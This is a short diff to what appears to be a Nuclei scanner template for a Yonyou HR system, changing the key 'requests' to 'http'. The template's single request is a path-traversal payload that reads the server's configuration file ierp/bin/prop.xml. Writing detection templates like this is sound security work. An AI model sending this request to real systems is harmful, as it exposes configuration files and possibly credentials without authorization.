@@ -4,7 +4,7 @@ info:
   author: str1am
   severity: high
   tags: yongyou
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
